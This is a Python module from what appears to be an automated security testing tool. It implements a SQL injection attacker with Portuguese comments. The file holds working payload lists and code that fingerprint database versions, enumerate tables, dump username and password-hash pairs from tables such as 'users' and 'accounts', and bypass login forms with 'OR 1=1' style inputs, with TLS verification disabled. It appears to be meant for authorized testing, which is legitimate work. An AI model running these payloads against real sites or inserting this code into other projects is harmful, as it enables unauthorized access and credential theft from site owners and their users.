# PreviSwit AI-ASPM
# Copyright (C) 2026 PreviSwit Team
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <https://www.gnu.org/licenses/>.
#
# SPDX-License-Identifier: GPL-3.0-or-later
"""
attack/sqli_attacker.py — Pipeline 4: Ataque automatizado de SQL Injection.

Lê findings do tipo SQLi dos pipelines anteriores e executa:
  1. Extração de versão do banco
  2. Listagem de tabelas (UNION-based / error-based)
  3. Dump de colunas e dados sensíveis (credenciais)
  4. Auth bypass via SQLi em forms de login
"""
import re
import requests
import urllib.parse
from core.utils import print_status, safe_request


# ─── Payloads ─────────────────────────────────────────────────────────────────

VERSION_PAYLOADS = [
    # MySQL / MariaDB
    ("' UNION SELECT NULL,@@version,NULL-- -",      r"(\d+\.\d+\.\d+)"),
    ("' AND 1=CAST(@@version AS INT)-- -",           r"(\d+\.\d+)"),
    # SQLite
    ("' UNION SELECT NULL,sqlite_version(),NULL-- -", r"(\d+\.\d+\.\d+)"),
    # PostgreSQL
    ("' UNION SELECT NULL,version(),NULL-- -",        r"PostgreSQL [\d.]+"),
    # MSSQL
    ("' UNION SELECT NULL,@@version,NULL-- -",        r"Microsoft SQL Server"),
]

TABLE_PAYLOADS_MYSQL = [
    "' UNION SELECT NULL,table_name,NULL FROM information_schema.tables WHERE table_schema=database()-- -",
    "' UNION SELECT NULL,GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()-- -",
]

TABLE_PAYLOADS_SQLITE = [
    "' UNION SELECT NULL,name,NULL FROM sqlite_master WHERE type='table'-- -",
    "' UNION SELECT NULL,GROUP_CONCAT(name),NULL FROM sqlite_master WHERE type='table'-- -",
]

COLUMN_PAYLOAD_MYSQL = (
    "' UNION SELECT NULL,GROUP_CONCAT(column_name),NULL "
    "FROM information_schema.columns WHERE table_name='{table}'-- -"
)

DUMP_PAYLOAD_MYSQL = (
    "' UNION SELECT NULL,GROUP_CONCAT({col1},0x3a,{col2}),NULL FROM {table}-- -"
)

AUTH_BYPASS_PAYLOADS = [
    ("' OR '1'='1'--",   "any"),
    ("' OR 1=1--",       "any"),
    ("admin'--",         "admin"),
    ("' OR 1=1#",        "any"),
    ("') OR ('1'='1",    "any"),
    ("\" OR \"1\"=\"1",  "any"),
]

SENSITIVE_TABLES = ["users", "user", "accounts", "account", "admin", "admins",
                    "customers", "login", "credentials", "members", "member",
                    "passwords", "passwd"]

SENSITIVE_COLS   = [("username","password"), ("email","password"),
                    ("user","pass"), ("login","hash"), ("email","hash"),
                    ("name","password"), ("user_name","passwd")]


# ─── Classe ───────────────────────────────────────────────────────────────────

class SQLiAttacker:
    """
    Recebe a lista de findings priorizados e ataca cada SQLi confirmado.
    Retorna um dict com os resultados do ataque.
    """

    def __init__(self, target: str, findings: list, context=None):
        self.target   = target
        self.findings = findings
        self.context  = context
        self.results  = {
            "db_version":     None,
            "tables":         [],
            "dumped_data":    [],
            "auth_bypassed":  [],
            "attack_log":     [],
        }

    # ── Helpers ──────────────────────────────────────────────────────────────

    def _get(self, url: str, params: dict) -> requests.Response | None:
        try:
            return requests.get(url, params=params, timeout=10,
                                verify=False, allow_redirects=True)
        except Exception:
            return None

    def _post(self, url: str, data: dict) -> requests.Response | None:
        try:
            return requests.post(url, data=data, timeout=10,
                                 verify=False, allow_redirects=True)
        except Exception:
            return None

    def _log(self, msg: str, level: str = "INFO"):
        print_status(f"[SQLi] {msg}", level)
        self.results["attack_log"].append(msg)

    # ── 1. Extração de versão ─────────────────────────────────────────────────

    def _extract_version(self, url: str, param: str, method: str):
        for payload, pattern in VERSION_PAYLOADS:
            params = {param: payload}
            r = self._get(url, params) if method == "GET" else self._post(url, params)
            if r:
                m = re.search(pattern, r.text, re.IGNORECASE)
                if m:
                    ver = m.group(0)
                    self.results["db_version"] = ver
                    self._log(f"Versão do banco: {ver}", "CRIT")
                    return ver
        return None

    # ── 2. Enumerar tabelas ───────────────────────────────────────────────────

    def _enum_tables(self, url: str, param: str, method: str):
        for payload in TABLE_PAYLOADS_MYSQL + TABLE_PAYLOADS_SQLITE:
            params = {param: payload}
            r = self._get(url, params) if method == "GET" else self._post(url, params)
            if r:
                # Procura padrões de lista de tabelas
                matches = re.findall(r"\b([a-z_][a-z0-9_]{2,})\b", r.text, re.IGNORECASE)
                candidates = [t for t in matches
                              if t.lower() not in ("null","html","body","div",
                                                   "script","class","style","href",
                                                   "http","https","the","and","for")]
                if len(candidates) > 3:
                    unique = list(dict.fromkeys(candidates))[:40]
                    self.results["tables"] = unique
                    self._log(f"Tabelas encontradas: {', '.join(unique[:15])}", "CRIT")
                    return unique
        return []

    # ── 3. Dump de dados sensíveis ────────────────────────────────────────────

    def _dump_sensitive(self, url: str, param: str, method: str, tables: list):
        for table in tables:
            if table.lower() not in SENSITIVE_TABLES:
                continue
            for col1, col2 in SENSITIVE_COLS:
                payload = DUMP_PAYLOAD_MYSQL.format(
                    table=table, col1=col1, col2=col2)
                params = {param: payload}
                r = self._get(url, params) if method == "GET" else self._post(url, params)
                if r and ":" in r.text:
                    # Extrai pares user:hash
                    found = re.findall(r"([a-zA-Z0-9._%+\-@]+:[a-fA-F0-9!$&*@#]{8,})",
                                       r.text)
                    if found:
                        self._log(f"DADOS EXTRAIDOS da tabela '{table}': "
                                  f"{len(found)} registro(s)", "CRIT")
                        self.results["dumped_data"].append({
                            "table":   table,
                            "columns": f"{col1}:{col2}",
                            "sample":  found[:5],
                            "total":   len(found),
                        })
                        return  # um dump é suficiente como PoC

    # ── 4. Auth Bypass em forms de login ─────────────────────────────────────

    def _auth_bypass(self, url: str, param: str):
        """Testa bypass de autenticação em formulários de login via SQLi."""
        login_indicators = ["dashboard", "welcome", "logout", "account",
                            "profile", "admin", "painel", "início"]
        fail_indicators  = ["invalid", "incorrect", "wrong", "failed",
                             "error", "inválido", "senha", "usuário"]

        for payload, hint_user in AUTH_BYPASS_PAYLOADS:
            data = {param: payload, "password": "anything123"}
            r = self._post(url, data)
            if not r:
                continue
            text_lower = r.text.lower()
            hits_ok  = sum(1 for w in login_indicators if w in text_lower)
            hits_bad = sum(1 for w in fail_indicators  if w in text_lower)
            if hits_ok > 0 and hits_bad == 0:
                self._log(f"AUTH BYPASS confirmado em {url} "
                          f"com payload '{payload}'", "CRIT")
                self.results["auth_bypassed"].append({
                    "url":     url,
                    "param":   param,
                    "payload": payload,
                    "hint":    f"user hint: {hint_user}",
                })
                return True
        return False

    # ── Run ───────────────────────────────────────────────────────────────────

    def run(self) -> dict:
        sqli_findings = [
            f for f in self.findings
            if "sql" in (f.get("issue","") + f.get("type","")).lower()
        ]

        if not sqli_findings:
            self._log("Nenhum SQLi confirmado nos findings — pulando.", "WARN")
            return self.results

        self._log(f"{len(sqli_findings)} finding(s) SQLi para explorar.", "CRIT")

        for finding in sqli_findings[:5]:  # limita a 5 para não sobrecarregar
            url    = finding.get("url", self.target)
            param  = finding.get("param", "id")
            method = finding.get("method", "GET").upper()

            self._log(f"Atacando: {url} | param={param} | method={method}", "INFO")

            # 1. Versão
            if not self.results["db_version"]:
                self._extract_version(url, param, method)

            # 2. Tabelas
            if not self.results["tables"]:
                tables = self._enum_tables(url, param, method)
            else:
                tables = self.results["tables"]

            # 3. Dump
            if tables and not self.results["dumped_data"]:
                self._dump_sensitive(url, param, method, tables)

            # 4. Auth bypass (apenas em URLs com login/auth no path)
            url_lower = url.lower()
            if any(w in url_lower for w in ["login","signin","auth","account"]):
                self._auth_bypass(url, param)

        return self.results
